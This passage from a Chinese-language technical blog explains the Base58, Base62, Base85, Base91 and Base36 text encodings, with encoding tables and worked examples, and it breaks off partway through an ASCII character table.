align="center">x</td></tr><tr><td align="center">11</td><td align="center">C</td><td align="center">26</td><td align="center">T</td><td align="center">41</td><td align="center">i</td><td align="center">56</td><td align="center">y</td></tr><tr><td align="center">12</td><td align="center">D</td><td align="center">27</td><td align="center">U</td><td align="center">42</td><td align="center">j</td><td align="center">57</td><td align="center">z</td></tr><tr><td align="center">13</td><td align="center">E</td><td align="center">28</td><td align="center">V</td><td align="center">43</td><td align="center">k</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">14</td><td align="center">F</td><td align="center">29</td><td align="center">W</td><td align="center">44</td><td align="center">m</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="4-4、编码示例"><a href="#4-4、编码示例" class="headerlink" title="4.4、编码示例"></a>4.4、编码示例</h3><ul><li>待编码数字：<code>123</code>；</li><li>编码后字符串：<code>38</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>对数字进行<code>取余58</code>的操作，获取余数：<code>123%58=7</code>，得到第一个编码为<code>8</code>；</li><li>对数字进行取整操作，新的数字为取整之后的值：<code>123/58=2</code>；</li><li>对新数字进行<code>取余58</code>的操作，获取余数：<code>2%58=2</code>，得到第二个编码为<code>3</code>；</li><li>依次循环最终新数字为<code>0</code>时结束；</li><li>最后得到的编码为<code>38</code>；</li></ul><h2 id="五、Base62"><a href="#五、Base62" class="headerlink" title="五、Base62"></a>五、Base62</h2><h3 id="5-1、编码规则"><a href="#5-1、编码规则" class="headerlink" title="5.1、编码规则"></a>5.1、编码规则</h3><p><code>Base62</code>编码使用<code>62</code>个<code>ASCII</code>可打印字符（数字<code>0～9</code>，字母<code>A~Z</code>，<code>a~z</code>）进行编码。</p><ul><li>通过对数字不断<code>取余62</code>，依据获取的余数对照编码表得到对应的编码值；</li><li>通过不断的对数字进行<code>取整</code>操作，得到新的数字进入下一个循环；</li><li>当新的数字为<code>0</code>时，结束编码；</li><li>通过对循环中每次得到的编码按照得到的先后顺序逆序排序（即第一次得到的编码在最终编码值的末尾），得到最终的编码值；</li></ul><h3 id="5-2、编码特征"><a href="#5-2、编码特征" class="headerlink" title="5.2、编码特征"></a>5.2、编码特征</h3><ul><li><code>Base62</code>和<code>Base64</code>相比唯一的区别就是少了两个特殊符号；</li><li><code>Base62</code>是一个改掉了<code>Base64</code>所有缺点的算法；</li><li>唯一的不足是因为码空间小了，会多占用<code>1/32</code>空间；</li><li>常被用来做短url的映射；</li></ul><h3 id="5-3、编码表"><a href="#5-3、编码表" class="headerlink" title="5.3、编码表"></a>5.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">16</td><td align="center">G</td><td align="center">32</td><td align="center">W</td><td align="center">48</td><td align="center">m</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">17</td><td align="center">H</td><td align="center">33</td><td align="center">X</td><td align="center">49</td><td align="center">n</td></tr><tr><td align="center">2</td><td align="center">2</td><td align="center">18</td><td align="center">I</td><td align="center">34</td><td align="center">Y</td><td align="center">50</td><td align="center">o</td></tr><tr><td align="center">3</td><td align="center">3</td><td align="center">19</td><td align="center">J</td><td align="center">35</td><td align="center">Z</td><td align="center">51</td><td align="center">p</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">20</td><td align="center">K</td><td align="center">36</td><td align="center">a</td><td align="center">52</td><td align="center">q</td></tr><tr><td align="center">5</td><td align="center">5</td><td align="center">21</td><td align="center">L</td><td align="center">37</td><td align="center">b</td><td align="center">53</td><td align="center">r</td></tr><tr><td align="center">6</td><td align="center">6</td><td align="center">22</td><td align="center">M</td><td align="center">38</td><td align="center">c</td><td align="center">54</td><td align="center">s</td></tr><tr><td align="center">7</td><td align="center">7</td><td align="center">23</td><td align="center">N</td><td align="center">39</td><td align="center">d</td><td align="center">55</td><td align="center">t</td></tr><tr><td align="center">8</td><td align="center">8</td><td align="center">24</td><td align="center">O</td><td align="center">40</td><td align="center">e</td><td align="center">56</td><td align="center">u</td></tr><tr><td align="center">9</td><td align="center">9</td><td align="center">25</td><td align="center">P</td><td align="center">41</td><td align="center">f</td><td align="center">57</td><td align="center">v</td></tr><tr><td align="center">10</td><td align="center">A</td><td align="center">26</td><td align="center">Q</td><td align="center">42</td><td align="center">g</td><td align="center">58</td><td align="center">w</td></tr><tr><td align="center">11</td><td align="center">B</td><td align="center">27</td><td align="center">R</td><td align="center">43</td><td align="center">h</td><td align="center">59</td><td align="center">x</td></tr><tr><td align="center">12</td><td align="center">C</td><td align="center">28</td><td align="center">S</td><td align="center">44</td><td align="center">i</td><td align="center">60</td><td align="center">y</td></tr><tr><td align="center">13</td><td align="center">D</td><td align="center">29</td><td align="center">T</td><td align="center">45</td><td align="center">j</td><td align="center">61</td><td align="center">z</td></tr><tr><td align="center">14</td><td align="center">E</td><td align="center">30</td><td align="center">U</td><td align="center">46</td><td align="center">k</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">15</td><td align="center">F</td><td align="center">31</td><td align="center">V</td><td align="center">47</td><td align="center">l</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="5-4、编码示例"><a href="#5-4、编码示例" class="headerlink" title="5.4、编码示例"></a>5.4、编码示例</h3><ul><li>待编码数字：<code>123</code>；</li><li>编码后字符串：<code>1z</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>对数字进行<code>取余62</code>的操作，获取余数：<code>123%62=61</code>，得到第一个编码为<code>z</code>；</li><li>对数字进行取整操作，新的数字为取整之后的值：<code>123/62=1</code>；</li><li>对新数字进行<code>取余62</code>的操作，获取余数：<code>1%62=1</code>，得到第二个编码为<code>1</code>；</li><li>依次循环最终新数字为<code>0</code>时结束；</li><li>最后得到的编码为<code>1z</code>；</li></ul><h2 id="六、Base85"><a href="#六、Base85" class="headerlink" title="六、Base85"></a>六、Base85</h2><p><code>Base85</code>又叫<code>ASCII85</code>，是<code>Paul E. Rutter</code>为<code>btoa</code>程序开发的一种<code>二进制</code>文本编码方式。</p><h3 id="6-1、编码规则"><a href="#6-1、编码规则" class="headerlink" title="6.1、编码规则"></a>6.1、编码规则</h3><p><code>Base85</code>编码使用<code>85</code>个<code>ASCII</code>可打印字符（数字<code>0～9</code>，字母<code>A~Z</code>，<code>a~u</code>，和一些其他字符）进行编码。</p><ul><li>每<code>4个ASCII</code>字符<code>一组</code>（如果最后的不够<code>4个ASCII</code>字符，右面填充二进制<code>全0</code>），<code>从左到右</code>拼接这<code>4个ASCII</code>对应的<code>二进制</code>的值，将该<code>二进制</code>转为<code>十进制</code>；</li><li>将得到的<code>十进制</code>数字对<code>58</code>做<code>取余</code>操作，得到第一个关键数字；</li><li>将得到的<code>十进制</code>数字对<code>58</code>做<code>取整</code>操作，得到新的<code>十进制</code>数字；</li><li>使用新的<code>十进制</code>数字再次对<code>58</code>进行<code>取余</code>操作，依次得到新的关键数字，直到取整的结果为<code>0</code>；</li><li>将最终得到的关键数字排序后（按照得到数字的先后，<code>从右向左</code>排序）；</li><li>参考<code>Base85</code>的编码表得到编码后的字符序列，细心点会发现，得到的关键数字加上<code>33</code>的话，也是对应的<code>ASCII</code>的值；</li><li>编码后的数据中包含像<code>反斜杠</code>、<code>引用</code>等转义字符也是<code>Base85</code>的缺点之一，因为这些字符在一些编程语言或基于文本的协议中有特殊的含义；</li></ul><h3 id="6-2、编码特征"><a href="#6-2、编码特征" class="headerlink" title="6.2、编码特征"></a>6.2、编码特征</h3><ul><li>利用<code>5个</code>ASCII字符来表示<code>4字节</code>的数据，如果每个ASCII字符占用<code>8比特</code>，则编码后的数据比原始数据大长度增加<code>1/4</code>；</li><li>比<code>UUENCODE</code>和<code>Base64</code>编码方式更加高效；</li><li><code>Base85</code>是<code>Adobe’s PostScript</code>和<code>Portable Document Format（PDF）</code>的主要编码模块；</li><li><code>4字节</code>可以表示<code>2^32=4294967296</code>个可能的值，而<code>85^5=4437053125</code>个可能的值，这就可以代表所有<code>32bit</code>的值，<code>85^4</code>可以表示<code>4182119424</code>个数值，所以<code>85的5次方</code>是基于<code>5个ASCII</code>字符表示<code>4byte</code>的最好且最小选择；</li></ul><h3 id="6-3、编码表"><a href="#6-3、编码表" class="headerlink" title="6.3、编码表"></a>6.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">!</td><td align="center">22</td><td align="center">7</td><td align="center">44</td><td align="center">M</td><td align="center">66</td><td align="center">c</td></tr><tr><td align="center">1</td><td align="center">“</td><td align="center">23</td><td align="center">8</td><td align="center">45</td><td align="center">N</td><td align="center">67</td><td align="center">d</td></tr><tr><td align="center">2</td><td align="center">#</td><td align="center">24</td><td align="center">9</td><td align="center">46</td><td align="center">O</td><td align="center">68</td><td align="center">e</td></tr><tr><td align="center">3</td><td align="center">$</td><td align="center">25</td><td align="center">:</td><td align="center">47</td><td align="center">P</td><td align="center">69</td><td align="center">f</td></tr><tr><td align="center">4</td><td align="center">%</td><td align="center">26</td><td align="center">;</td><td align="center">48</td><td align="center">Q</td><td align="center">70</td><td align="center">g</td></tr><tr><td align="center">5</td><td align="center">&amp;</td><td align="center">27</td><td align="center">&lt;</td><td align="center">49</td><td align="center">R</td><td align="center">71</td><td align="center">h</td></tr><tr><td align="center">6</td><td align="center">’</td><td align="center">28</td><td align="center">&#x3D;</td><td align="center">50</td><td align="center">S</td><td align="center">72</td><td align="center">i</td></tr><tr><td align="center">7</td><td align="center">(</td><td align="center">29</td><td align="center">&gt;</td><td align="center">51</td><td align="center">T</td><td align="center">73</td><td align="center">j</td></tr><tr><td align="center">8</td><td align="center">)</td><td align="center">30</td><td align="center">?</td><td align="center">52</td><td align="center">U</td><td align="center">74</td><td align="center">k</td></tr><tr><td align="center">9</td><td align="center">*</td><td align="center">31</td><td align="center">@</td><td align="center">53</td><td align="center">V</td><td align="center">75</td><td align="center">l</td></tr><tr><td align="center">10</td><td align="center">+</td><td align="center">32</td><td align="center">A</td><td align="center">54</td><td align="center">W</td><td align="center">76</td><td align="center">m</td></tr><tr><td align="center">11</td><td align="center">,</td><td align="center">33</td><td align="center">B</td><td align="center">55</td><td align="center">X</td><td align="center">77</td><td align="center">n</td></tr><tr><td align="center">12</td><td align="center">-</td><td align="center">34</td><td align="center">C</td><td align="center">56</td><td align="center">Y</td><td align="center">78</td><td align="center">o</td></tr><tr><td align="center">13</td><td align="center">.</td><td align="center">35</td><td align="center">D</td><td align="center">57</td><td align="center">Z</td><td align="center">79</td><td align="center">p</td></tr><tr><td align="center">14</td><td align="center">&#x2F;</td><td align="center">36</td><td align="center">E</td><td align="center">58</td><td align="center">[</td><td align="center">80</td><td align="center">q</td></tr><tr><td align="center">15</td><td align="center">0</td><td align="center">37</td><td align="center">F</td><td align="center">59</td><td align="center">\</td><td align="center">81</td><td align="center">r</td></tr><tr><td align="center">16</td><td align="center">1</td><td align="center">38</td><td align="center">G</td><td align="center">60</td><td align="center">]</td><td align="center">82</td><td align="center">s</td></tr><tr><td align="center">17</td><td align="center">2</td><td align="center">39</td><td align="center">H</td><td align="center">61</td><td align="center">^</td><td align="center">83</td><td align="center">t</td></tr><tr><td align="center">18</td><td align="center">3</td><td align="center">40</td><td align="center">I</td><td align="center">62</td><td align="center">_</td><td align="center">84</td><td align="center">u</td></tr><tr><td align="center">19</td><td align="center">4</td><td align="center">41</td><td align="center">J</td><td align="center">63</td><td align="center">&#96;</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">5</td><td align="center">42</td><td align="center">K</td><td align="center">64</td><td align="center">a</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">21</td><td align="center">6</td><td align="center">43</td><td align="center">L</td><td align="center">65</td><td align="center">b</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="6-4、编码示例"><a href="#6-4、编码示例" class="headerlink" title="6.4、编码示例"></a>6.4、编码示例</h3><ul><li>待编码字符串：<code>sure</code>；</li><li>编码后字符串：<code>F*2M7</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>字符串<code>sure</code>的每位字符对应的ASCII的十进制分别为：<code>115</code>，<code>117</code>，<code>114</code>，<code>101</code>；</li><li>将十进制转换为二进制，得到的二进制序列为：<code>01110011 01110101 01110010 01100101</code>；</li><li>该二进制拼接起来后对应的十进制数字为：<code>1937076837</code>；</li><li>对该十进制数字进行循环的取余&#x2F;整操作，按照先后顺序依次得到的余数分别为：<code>22</code>，<code>44</code>，<code>17</code>，<code>9</code>，<code>37</code>；</li><li>参考Base85的编码表，对应的编码值分别为：<code>7</code>，<code>M</code>，<code>2</code>，<code>*</code>，<code>F</code>；</li><li>按照得到的余数的先后顺序逆序排列后得到最终的编码值为：<code>F*2M7</code>；</li></ul><h2 id="七、Base91"><a href="#七、Base91" class="headerlink" title="七、Base91"></a>七、Base91</h2><p>由<code>Joachim Henke</code>在2005年发明，官方的介绍页面为：<a href="http://base91.sourceforge.net/">basE91 encoding</a>。</p><h3 id="7-1、编码规则"><a href="#7-1、编码规则" class="headerlink" title="7.1、编码规则"></a>7.1、编码规则</h3><p>加密使用类似于<code>Base64</code>的方法，但将字母扩展为<code>91</code>个字符：<code>94</code>个可打印的<code>ASCII</code>字符（从<code>0x21</code>到<code>0x7E</code>），省略了<code>-</code>，<code>\</code>和<code>&#39;</code>；为了简化，将数据分为<code>13位二进制</code>数据包（即<code>2^13=8192</code>个值），然后将其编码为<code>2个字母</code>（包含<code>91</code>个字符，其中<code>91^2=8281</code>）；</p><ul><li>将输入的数据看作<code>二进制</code>信息流；</li><li>每次从信息流中读取<code>13位</code>的比特数据，将这组合成的<code>13位</code>比特转换为<code>10进制</code>的整数；</li><li>如果该整数<code>小于或等于88</code>，则额外再读取一位，并将这一位放在整数的第<code>14</code>位（最低位为1）（原因：由于<code>91^2=8281</code>，最大可表示为<code>8280</code>，而<code>2^13=8192</code>，因此即使二进制<code>13</code>位全部为<code>1</code>，也可能）；</li><li>将得到的整数拆分为<code>两个</code>编码值，第一个编码值为<code>整数%91</code>，第二个编码值为<code>整数/91</code>，依据<code>Base91</code>的编码表得到对应的编码后的数据；</li><li>依次循环编码接下来的<code>二进制</code>信息流；</li></ul><h3 id="7-2、编码特征"><a href="#7-2、编码特征" class="headerlink" title="7.2、编码特征"></a>7.2、编码特征</h3><ul><li>该算法相对于<code>Base64</code>来说比较复杂，但更节省空间；</li><li>与<code>Base64</code>不同，输出的大小有点依赖于输入字节，长度为<code>0x00</code>的<code>n序列</code>将<code>短于</code>长度为<code>0xFF</code>的<code>n序列</code>（其中<code>n</code>是足够大的数字）;</li></ul><h3 id="7-3、编码表"><a href="#7-3、编码表" class="headerlink" title="7.3、编码表"></a>7.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td align="center">23</td><td align="center">X</td><td align="center">46</td><td align="center">u</td><td align="center">69</td><td align="center">*</td></tr><tr><td align="center">1</td><td align="center">B</td><td align="center">24</td><td align="center">Y</td><td align="center">47</td><td align="center">v</td><td align="center">70</td><td align="center">+</td></tr><tr><td align="center">2</td><td align="center">C</td><td align="center">25</td><td align="center">Z</td><td align="center">48</td><td align="center">w</td><td align="center">71</td><td align="center">,</td></tr><tr><td align="center">3</td><td align="center">D</td><td align="center">26</td><td align="center">a</td><td align="center">49</td><td align="center">x</td><td align="center">72</td><td align="center">.</td></tr><tr><td align="center">4</td><td align="center">E</td><td align="center">27</td><td align="center">b</td><td align="center">50</td><td align="center">y</td><td align="center">73</td><td align="center">&#x2F;</td></tr><tr><td align="center">5</td><td align="center">F</td><td align="center">28</td><td align="center">c</td><td align="center">51</td><td align="center">z</td><td align="center">74</td><td align="center">:</td></tr><tr><td align="center">6</td><td align="center">G</td><td align="center">29</td><td align="center">d</td><td align="center">52</td><td align="center">0</td><td align="center">75</td><td align="center">;</td></tr><tr><td align="center">7</td><td align="center">H</td><td align="center">30</td><td align="center">e</td><td align="center">53</td><td align="center">1</td><td align="center">76</td><td align="center">&lt;</td></tr><tr><td align="center">8</td><td align="center">I</td><td align="center">31</td><td align="center">f</td><td align="center">54</td><td align="center">2</td><td align="center">77</td><td align="center">&#x3D;</td></tr><tr><td align="center">9</td><td align="center">J</td><td align="center">32</td><td align="center">g</td><td align="center">55</td><td align="center">3</td><td align="center">78</td><td align="center">&gt;</td></tr><tr><td align="center">10</td><td align="center">K</td><td align="center">33</td><td align="center">h</td><td align="center">56</td><td align="center">4</td><td align="center">79</td><td align="center">?</td></tr><tr><td align="center">11</td><td align="center">L</td><td align="center">34</td><td align="center">i</td><td align="center">57</td><td align="center">5</td><td align="center">80</td><td align="center">@</td></tr><tr><td align="center">12</td><td align="center">M</td><td align="center">35</td><td align="center">j</td><td align="center">58</td><td align="center">6</td><td align="center">81</td><td align="center">[</td></tr><tr><td align="center">13</td><td align="center">N</td><td align="center">36</td><td align="center">k</td><td align="center">59</td><td align="center">7</td><td align="center">82</td><td align="center">]</td></tr><tr><td align="center">14</td><td align="center">O</td><td align="center">37</td><td align="center">l</td><td align="center">60</td><td align="center">8</td><td align="center">83</td><td align="center">^</td></tr><tr><td align="center">15</td><td align="center">P</td><td align="center">38</td><td align="center">m</td><td align="center">61</td><td align="center">9</td><td align="center">84</td><td align="center">_</td></tr><tr><td align="center">16</td><td align="center">Q</td><td align="center">39</td><td align="center">n</td><td align="center">62</td><td align="center">!</td><td align="center">85</td><td align="center">&#96;</td></tr><tr><td align="center">17</td><td align="center">R</td><td align="center">40</td><td align="center">o</td><td align="center">63</td><td align="center">#</td><td align="center">86</td><td align="center">{</td></tr><tr><td align="center">18</td><td align="center">S</td><td align="center">41</td><td align="center">p</td><td align="center">64</td><td align="center">$</td><td align="center">87</td><td align="center">|</td></tr><tr><td align="center">19</td><td align="center">T</td><td align="center">42</td><td align="center">q</td><td align="center">65</td><td align="center">%</td><td align="center">88</td><td align="center">}</td></tr><tr><td align="center">20</td><td align="center">U</td><td align="center">43</td><td align="center">r</td><td align="center">66</td><td align="center">&amp;</td><td align="center">89</td><td align="center">~</td></tr><tr><td align="center">21</td><td align="center">V</td><td align="center">44</td><td align="center">s</td><td align="center">67</td><td align="center">(</td><td align="center">90</td><td align="center">“</td></tr><tr><td align="center">22</td><td align="center">W</td><td align="center">45</td><td align="center">t</td><td align="center">68</td><td align="center">)</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="7-4、编码示例"><a href="#7-4、编码示例" class="headerlink" title="7.4、编码示例"></a>7.4、编码示例</h3><ul><li>待编码字符串：<code>abc</code>；</li><li>编码后字符串：<code>#G(I</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>字符串<code>abc</code>的每位字符对应的<code>ASCII</code>的<code>十进制</code>分别为：<code>97</code>，<code>98</code>，<code>99</code>；</li><li>将<code>十进制</code>转换为<code>二进制</code>，得到的<code>二进制</code>序列为：<code>01100001  01100010  01100011</code>；</li><li>读取该<code>二进制</code>信息流之后，得到的第一个<code>二进制</code>串为：<code>00010  01100001</code>，该<code>二进制</code>串的后半部分为<code>字符a</code>的<code>二进制</code>编码，前半部分为<code>字符b</code>的部分<code>二进制</code>编码；</li><li>拼接后的<code>二进制</code>串对应的<code>十进制</code>整数为：<code>609</code>，因此首先得到的两个编码值为：<code>609%91=63</code>，<code>609/91=6</code>，对应的编码为：<code>#</code>、<code>G</code>；</li><li>继续处理剩余的二进制序列为：<code>00 01100011 011</code>，对应得到的<code>十进制</code>整数为：<code>795</code>，因此得到的两个编码值为：<code>795%91=67</code>，<code>795/91=8</code>，对应的编码为：<code>(</code>、<code>I</code>；</li><li>因此最终得到的最终编码为：<code>#G(I</code>；</li></ul><h2 id="八、Base-X-2～36"><a href="#八、Base-X-2～36" class="headerlink" title="八、Base X(2～36)"></a>八、Base X(2～36)</h2><p><code>BaseX(2～36)</code>，其中<code>X</code>可以为<code>2～36</code>的所有编码规则完全一致，这里以<code>Base36</code>为例作一下详细介绍。</p><h3 id="8-1、编码规则"><a href="#8-1、编码规则" class="headerlink" title="8.1、编码规则"></a>8.1、编码规则</h3><p><code>Base36</code>编码使用<code>36</code>个<code>ASCII</code>可打印字符（数字<code>0-9</code>和字母<code>A-Z</code>）对<strong>数字</strong>进行编码。</p><ul><li>通过对数字不断<code>取余36</code>，依据获取的余数对照编码表得到对应的编码值；</li><li>通过不断的对数字进行<code>取整</code>操作，得到新的数字进入下一个循环；</li><li>当新的数字为<code>0</code>时，结束编码；</li><li>通过对循环中每次得到的编码按照得到的先后顺序逆序排序（即第一次得到的编码在最终编码值的末尾），得到最终的编码值；</li></ul><h3 id="8-2、编码特征"><a href="#8-2、编码特征" class="headerlink" title="8.2、编码特征"></a>8.2、编码特征</h3><ul><li><code>Base 36</code>的编码规则不同于<code>Base 16/32/64</code>，它无法按照比特范围进行编码操作，需要按照<code>取余/整</code>的不断操作，经过与编码表的对应获得最终的编码值；</li><li>对于字符串的相关编码操作，需要将<code>String</code>的字符串转换为基数为<code>2～36</code>的无符号长整型，再进行编码操作；</li><li><code>有符号的32位整数</code>的<code>最大值</code>的<code>Base36</code>编码为：<code>ZIK0ZJ</code>；</li><li><code>有符号的64位整数</code>的<code>最大值</code>的<code>Base36</code>编码为：<code>1Y2P0IJ32E8E7</code>；</li></ul><h3 id="8-3、编码表"><a href="#8-3、编码表" class="headerlink" title="8.3、编码表"></a>8.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">12</td><td align="center">C</td><td align="center">24</td><td align="center">O</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">13</td><td align="center">D</td><td align="center">25</td><td align="center">P</td></tr><tr><td align="center">2</td><td align="center">2</td><td align="center">14</td><td align="center">E</td><td align="center">26</td><td align="center">Q</td></tr><tr><td align="center">3</td><td align="center">3</td><td align="center">15</td><td align="center">F</td><td align="center">27</td><td align="center">R</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">16</td><td align="center">G</td><td align="center">28</td><td align="center">S</td></tr><tr><td align="center">5</td><td align="center">5</td><td align="center">17</td><td align="center">H</td><td align="center">29</td><td align="center">T</td></tr><tr><td align="center">6</td><td align="center">6</td><td align="center">18</td><td align="center">I</td><td align="center">30</td><td align="center">U</td></tr><tr><td align="center">7</td><td align="center">7</td><td align="center">19</td><td align="center">J</td><td align="center">31</td><td align="center">V</td></tr><tr><td align="center">8</td><td align="center">8</td><td align="center">20</td><td align="center">K</td><td align="center">32</td><td align="center">W</td></tr><tr><td align="center">9</td><td align="center">9</td><td align="center">21</td><td align="center">L</td><td align="center">33</td><td align="center">X</td></tr><tr><td align="center">10</td><td align="center">A</td><td align="center">22</td><td align="center">M</td><td align="center">34</td><td align="center">Y</td></tr><tr><td align="center">11</td><td align="center">B</td><td align="center">23</td><td align="center">N</td><td align="center">35</td><td align="center">Z</td></tr></tbody></table><h3 id="8-4、编码示例"><a href="#8-4、编码示例" class="headerlink" title="8.4、编码示例"></a>8.4、编码示例</h3><ul><li>待编码数字：<code>123</code>；</li><li>编码后字符串：<code>3F</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>对数字进行<code>取余36</code>的操作，获取余数：<code>123%36=15</code>，得到第一个编码为<code>F</code>；</li><li>对数字进行取整操作，新的数字为取整之后的值：<code>123/36=3</code>；</li><li>对新数字进行<code>取余36</code>的操作，获取余数：<code>3%36=3</code>，得到第二个编码为<code>3</code>；</li><li>依次循环最终新数字为<code>0</code>时结束；</li><li>最后得到的编码为<code>3F</code>；</li></ul><h2 id="九、ASCII字符表"><a href="#九、ASCII字符表" class="headerlink" title="九、ASCII字符表"></a>九、ASCII字符表</h2><h3 id="9-1、ASCII可显示字符"><a href="#9-1、ASCII可显示字符" class="headerlink" title="9.1、ASCII可显示字符"></a>9.1、ASCII可显示字符</h3><table><thead><tr><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">字符</th><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">字符</th><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">00100000</td><td align="center">32</td><td align="center">0x20</td><td align="center">空格</td><td align="center">01000000</td><td align="center">64</td><td align="center">0x40</td><td align="center">@</td><td align="center">01100000</td><td align="center">96</td><td align="center">0x60</td><td align="center">&#96;</td></tr><tr><td align="center">00100001</td><td align="center">33</td><td align="center">0x21</td><td align="center">!</td><td align="center">01000001</td><td align="center">65</td><td align="center">0x41</td><td align="center">A</td><td align="center">01100001</td><td align="center">97</td><td align="center">0x61</td><td align="center">a</td></tr><tr><td align="center">00100010</td><td align="center">34</td><td align="center">0x22</td><td align="center">“</td><td align="center">01000010</td><td align="center">66</td><td align="center">0x42</td><td align="center">B</td><td align="center">01100010</td><td align="center">98</td><td align="center">0x62</td><td align="center">b</td></tr><tr><td align="center">00100011</td><td align="center">35</td><td align="center">0x23</td><td align="center">#</td><td align="center">01000011</td><td align="center">67</td><td align="center">0x43</td><td align="center">C</td><td align="center">01100011</td><td align="center">99</td><td align="center">0x63</td><td align="center">c</td></tr><tr><td align="center">00100100</td><td align="center">36</td><td align="center">0x24</td><td align="center">$</td><td align="center">01000100</td><td align="center">68</td><td align="center">0x44</td><td align="center">D</td><td align="center">01100100</td><td align="center">100</td><td align="center">0x64</td><td align="center">d</td></tr><tr><td align="center">00100101</td><td align="center">37</td><td align="center">0x25</td><td align="center">%</td><td align="center">01000101</td><td align="center">69</td><td align="center">0x45</td><td align="center">E</td><td align="center">01100101</td><td align="center">101</td><td align="center">0x65</td><td align="center">e</td></tr><tr><td align="center">00100110</td><td align="center">38</td><td align="center">0x26</td><td align="center">&amp;</td><td align="center">01000110</td><td align="center">70</td><td align="center">0x46</td><td align="center">F</td><td align="center">01100110</td><td align="center">102</td><td align="center">0x66</td><td align="center">f</td></tr><tr><td align="center">00100111</td><td align="center">39</td><td align="center">0x27</td><td align="center">‘</td><td align="center">01000111</td><td align="center">71</td><td align="center">0x47</td><td align="center">G</td><td align="center">01100111</td><td align="center">103</td><td align="center">0x67</td><td align="center">g</td></tr><tr><td align="center">00101000</td><td align="center">40</td><td align="center">0x28</td><td align="center">(</td><td align="center">01001000</td><td align="center">72</td><td align="center">0x48</td><td align="center">H</td><td align="center">01101000</td><td align="center">104</td><td align="center">0x68</td><td align="center">h</td></tr><tr><td align="center">00101001</td><td align="center">41</td><td align="center">0x29</td><td align="center">)</td><td align="center">01001001</td><td align="center">73</td><td align="center">0x49</td><td align="center">I</td><td align="center">01101001</td><td align="center">105</td><td align="center">0x69</td><td align="center">i</td></tr><tr><td align="center">00101010</td><td align="center">42</td><td align="center">0x2A</td><td align="center">*</td><td align="center">01001010</td><td align="center">74</td><td align="center">0x4A</td><td align="center">J</td><td align="center">01101010</td><td align="center">106</td><td align="center">0x6A</td><td align="center">j</td></tr><tr><td align="center">00101011</td><td align="center">43</td><td align="center">0x2B</td><td align="center">+</td><td align="center">01001011</td><td align="center">75</td><td align="center">0x4B</td><td align="center">K</td><td align="center">01101011</td><td align="center">107</td><td align="center">0x6B</td><td align="center">k</td></tr><tr><td align="center">00101100</td><td align="center">44</td><td align="center">0x2C</td><td align="center">,</td><td align="center">01001100</td><td align="center">76</td><td align="center">0x4C</td><td align="center">L</td><td align="center">01101100</td><td align="center">108</td><td align="center">0x6C</td><td align="center">l</td></tr><tr><td align="center">00101101</td><td align="center">45</td><td align="center">0x2D</td><td align="center">-</td><td align="center">01001101</td><td align="center">77</td><td align="center">0x4D</td><td align="center">M</td><td align="center">01101101</td><td align="center">109</td><td align="center">0x6D</td><td align="center">m</td></tr><tr><td align="center">00101110</td><td align="center">46</td><td align="center">0x2E</td><td align="center">.</td><td align="center">01001110</td><td align="center">78</td><td align="center">0x4E</td><td align="center">N</td><td align="center">01101110</td><td align="center">110</td><td align="center">0x6E</td><td align="center">n</td></tr><tr><td align="center">00101111</td><td align="center">47</td><td align="center">0x2F</td><td align="center">&#x2F;</td><td align="center">01001111</td><td align="center">79</td><td align="center">0x4F</td><td align="center">O</td><td align="center">01101111</td><td align="center">111</td><td align="center">0x6F</td><td align="center">o</td></tr><tr><td align="center">00110000</td><td align="center">48</td><td align="center">0x30</td><td align="center">0</td><td align="center">01010000</td><td align="center">80</td><td align="center">0x50</td><td align="center">P</td><td align="center">01110000</td><td align="center">112</td><td align="center">0x70</td><td align="center">p</td></tr><tr><td align="center">00110001</td><td align="center">49</td><td align="center">0x31</td><td align="center">1</td><td align="center">01010001</td><td align="center">81</td><td align="center">0x51</td><td align="center">Q</td><td align="center">01110001</td><td align="center">113</td><td align="center">0x71</td><td align="center">q</td></tr><tr><td align="center">00110010</td><td align="center">50</td><td align="center">0x32</td><td align="center">2</td><td align="center">01010010</td><td align="center">82</td><td align="center">0x52</td><td align="center">R</td><td align="center">01110010</td><td align="center">114</td><td align="center">0x72</td><td align="center">r</td></tr><tr><td align="center">00110011</td><td align="center">51</td><td align="center">0x33</td><td align="center">3</td><td align="center">01010011</td><td align="center">83</td><td align="center">0x53</td><td align="center">S</td><td align="center">01110011</td><td align="center">115</td><td align="center">0x73</td><td align="center">s</td></tr><tr><td align="center">00110100</td><td align="center">52</td><td align="center">0x34</td><td align="center">4</td><td 